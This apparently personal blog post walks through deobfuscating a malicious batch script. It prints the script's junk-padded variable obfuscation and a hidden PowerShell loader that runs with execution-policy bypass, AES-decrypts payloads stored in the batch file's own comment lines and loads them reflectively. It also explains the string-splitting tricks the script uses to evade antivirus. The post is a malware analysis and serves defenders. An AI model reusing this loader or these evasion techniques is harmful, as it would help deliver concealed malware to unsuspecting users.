---
layout: post
title: Batch Script Obfuscation
subtitle: Obfuscation techniques seen in the wild
cover-img: /assets/img/honk.png
thumbnail-img: /assets/img/bat.png
share-img: /assets/img/bat.png
tags: []
---

Earlier this week, I was investigating a batch script that made its way onto someone's system. I enjoy deobfuscating files, so here are some things specific to (but maybe not exclusive to) batch file obfuscation that I saw.

Below is the first part of the batch file. Essentially what was going on was there was a bunch of junk data that was inserted between some variables / text. I replaced the real junk to make it more visible, but the original junk data was a lot more randomized and less apparent that it repeated. 
~~~
@echo off
set s=%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%s%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%t%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%l%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%o%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%c%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%a%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%l%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%
set e=%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%n%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%a%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%b%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%
set d=%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%l%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%d%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%l%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%a%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%y%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%d%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%
set x=%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%e%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%x%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%p%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%a%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%n%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%s%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%i%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%o%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%n%asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf%
set rah=%s% %e%%d%%x%
call %rah%
~~~

From there, if we trim it down, we get this

~~~
@echo off
set s=setlocal
set e=enab
set d=ledelayed
set x=expansion
set rah=s edx
call rah
~~~

Which further evaluates to

~~~
@echo off
setlocal enabledelayedexpansion
~~~

This was the first part of the obfuscation.


From here, it is obvious from the last line that there is something going on with powershell. If you also look at the top a bit, we also see **-noprofile -windowstyle hidden -ep bypass -command**, which is also very common in malicious powershell operations. Something else that is going on here, which is a key clue, is **[System.Security.Cryptography.Aes]::Create()**, which is a .NET constructor for creating AES-encrypted objects. So, the next section likely decrypts and runs a payload, but lets dive deeper first. Lastly, we some concatenated strings, aimed at evading static AV detection (**'S'+'ys'+'t'+'e'+'m'+'.E'+'nv'+'i'+'ro'+'n'+'me'+'n'+'t'**)

The dollar sign, **$**, denotes a variable in powershell. We see many more gibberish strings immediately preceded by the dollar signs, which means that the variables have been obfuscated. In this example, it is not through encoding or encryption, but rather their intention is obfuscated. It would be trivial for a computer to execute this code, but tough for a human to understand what is going on. From here, it is, at least in my experience, a game of guessing and renaming variables to what you think they might be. If you have no idea where to begin at guessing though, no problem! I find it good to just name things whatever, like var_1, var_2, and so on.

~~~
set "zsexdrzsexdrzsexdrzsexdrzsexdr=set"
set "bhunjibhunjibhunjibhunjibhunji=!zsexdrzsexdrzsexdrzsexdrzsexdr!"
!bhunjibhunjibhunjibhunjibhunji! "biEKBNtmaExERuKwsVMLBRoxNfgdBOZZfTeqnDLUczJcuRjyEOeuFpygzSomIwMJHSwaSolxpsaaYOpbrOAoyGSBUXFzabmcAHQJTBmedCbxRtefrpoVznryBpCfsoZqPRtcTGrFKZCPftRwdYOascUUJKqkhXdFsgRIQhdfqGYthaiRzKcwUswHzkjXLHmIsJQolrhgvItOJteTIbStFwpjudZXnyNKuHNmURTsdITjBRKyhxwzrHpgWLffJkOoRVGuSmreBkaVDlUziIhbNFFbbFylVuDeDwuwqThpzjeXIrMuXaAmorLmsWnaBQoFiImpGRAJVwtzRXXoFZcjaLMPMboQCcMSJWVFGsuZkAXbhxnGN=-noprofile -windowstyle hidden -ep bypass -command $unceunceunceunceunceunceunec = '%~f0';	$qwertyqwertyqwertyqwertyqwerty=[System.Security.Cryptography.Aes]::Create();		$qwertyqwertyqwertyqwertyqwerty.IV=[System.Convert]::FromBase64String('1JvmIAo8jn8Quu7BilO+6w==');	$qwertyqwertyqwertyqwertyqwerty.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	$qwertyqwertyqwertyqwertyqwerty.Key=[System.Convert]::FromBase64String('9PVEPxhrf9bAPo5nbYothLVgwj9qp8wjNqedVM0sNJg=');		$qwertyqwertyqwertyqwertyqwerty.Mode=[System.Security.Cryptography.CipherMode]::CBC;function decrypt_function($param_var){	$asdfgasdfgasdfgasdfgasdfg=$qwertyqwertyqwertyqwertyqwerty.CreateDecryptor();	$yuiopyuiopyuiopyuiopyuiop=$asdfgasdfgasdfgasdfgasdfg.TransformFinalBlock($param_var, 0, $param_var.Length);	$yuiopyuiopyuiopyuiopyuiop;}function execute_function($param_var,$param2_var){	$ghjklghjklghjklghjklghjkl=[System.Reflection.Assembly]::Load([byte[]]$param_var);	$zxcvbzxcvbzxcvbzxcvbzxcvb=$ghjklghjklghjklghjklghjkl.EntryPoint;	$zxcvbzxcvbzxcvbzxcvbzxcvb.Invoke($null, $param2_var);}$host.UI.RawUI.WindowTitle = $unceunceunceunceunceunceunec;$njimkonjimkonjimkonjimkonjimko = [type]::GetType('Syst'+'e'+'m'+'.I'+'O.F'+'i'+'l'+'e');$cvbnmcvbnmcvbnmcvbnmcvbnm = [type]::GetType('S'+'ys'+'t'+'e'+'m'+'.E'+'nv'+'i'+'ro'+'n'+'me'+'n'+'t');$plokmplokmplokmplokmplokm = $njimkonjimkonjimkonjimkonjimko::ReadAllText($unceunceunceunceunceunceunec);$ytrewytrewytrewytrewytrew = $cvbnmcvbnmcvbnmcvbnmcvbnm::NewLine;$poiuypoiuypoiuypoiuypoiuy = $plokmplokmplokmplokmplokm.Split($ytrewytrewytrewytrewytrew);$jhgfdjhgfdjhgfdjhgfdjhgfd = $poiuypoiuypoiuypoiuypoiuy;foreach ($vgybhuvgybhuvgybhuvgybhuvgybhu in $jhgfdjhgfdjhgfdjhgfdjhgfd) {	if ($vgybhuvgybhuvgybhuvgybhuvgybhu.StartsWith(':: '))	{		$tfcrdxtfcrdxtfcrdxtfcrdxtfcrdx=$vgybhuvgybhuvgybhuvgybhuvgybhu.Substring(3);		break;	}}$payloads_var=[string[]]$tfcrdxtfcrdxtfcrdxtfcrdxtfcrdx.Split('\');$payload1_var= decrypt_function ([Convert]::FromBase64String($payloads_var[0]));$payload2_var= decrypt_function ([Convert]::FromBase64String($payloads_var[1]));execute_function $payload1_var $null;execute_function $payload2_var (,[string[]] ('%*'));"
!bhunjibhunjibhunjibhunjibhunji! "ckgMzaltivLxuGAeCevHMWWHEdYyKliYXvbInLefrxEmnhjvzletlABeTtxDfCRNHZEDcZpGxHioaPbbHebBYQXCZdICsBNzMFcpjRABMdjjcBhBWPfScDsKoNuCAcJGRlPirXRNXderAmpuF="%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "
~~~

After som trial and error, and with the help of ChatGPT to guess some of the names, this is what i landed on

~~~
!delayed_var_2! "profile_var=-noprofile -windowstyle hidden -ep bypass -command $command = '%~f0';
$aesEncryptor=[System.Security.Cryptography.Aes]::Create();
$aesEncryptor.IV=[System.Convert]::FromBase64String('QUVTLUlW');
$aesEncryptor.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
$aesEncryptor.Key=[System.Convert]::FromBase64String('QUVTLUtleQ==');
$aesEncryptor.Mode=[System.Security.Cryptography.CipherMode]::CBC;
function decrypt_function($param_var)
  {
  $decryptor = $aesEncryptor.CreateDecryptor();
  $decrypted_bytes = $decryptor.TransformFinalBlock($param_var, 0, $param_var.Length);
  $decrypted_bytes;
  }
function execute_function($param_var, $param2_var)
  {
  $assembly = [System.Reflection.Assembly]::Load([byte[]]$param_var);
  $entry_point = $assembly.EntryPoint;
  $entry_point.Invoke($null, $param2_var);
  }
$host.UI.RawUI.WindowTitle = $payloadFilePath;
$fileType = [type]::GetType('System.IO.File');
$envType = [type]::GetType('System.Environment');
$payloadFileContents = $fileType::ReadAllText($payloadFilePath);
$newline = $envType::NewLine;
$lines = $payloadFileContents.Split($newline);
$lineArray = $lines;
foreach ($line in $lineArray)
  {
  if ($line.StartsWith(':: '))
    {
    $payloadDataEncoded = $line.Substring(3);
    break;
    }
  }
!delayed_var_2! "unknown"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "
~~~
